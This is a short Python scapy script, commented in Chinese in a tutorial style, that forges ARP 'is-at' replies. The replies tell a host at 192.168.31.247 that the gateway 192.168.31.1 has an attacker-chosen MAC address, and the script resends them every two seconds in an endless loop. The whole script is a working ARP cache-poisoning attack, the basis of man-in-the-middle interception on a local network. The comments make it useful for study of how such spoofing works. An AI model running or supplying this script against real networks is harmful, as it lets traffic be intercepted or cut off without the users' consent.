from scapy.all import *
from scapy.layers.l2 import Ether, ARP

# 注意这里面的几个方法
# Ether用来构建以太网数据包
# ARP用来构建ARP数据包
# sendp方法在第二层发送数据包,send(arp)是表示在第三层发送数据包

# 意思就是告诉192.168.31.247这个地址的主机，IP为192.168.31.1的主机MAC地址是08:00:27:97:d1:f5
# 如果不写目标主机的IP和MAC则默认以广播的形式发送
eth = Ether()
eth.dst = 'ff:ff:ff:ff:ff:ff'
arp = ARP(op = 'is-at',hwsrc = '08:00:27:97:d1:f5',psrc = '192.168.31.1',hwdst = '2c:56:dc:d3:ab:db',
          pdst = '192.168.31.247')

# scapy重载了"/"操作符，可以用来表示两个协议层的组合
# 这里我们输出一下数据包的结构信息
print ((eth/arp).show())
#sendp（）中可以通过inter参数来设置两个数据包之间等待的时间间隔
scapy.all.sendp(eth / arp, inter = 2, loop = 1)   # 发送封包，并且间隔2秒，loop=1重复发送
                                                #不指定loop表示发送一个即可




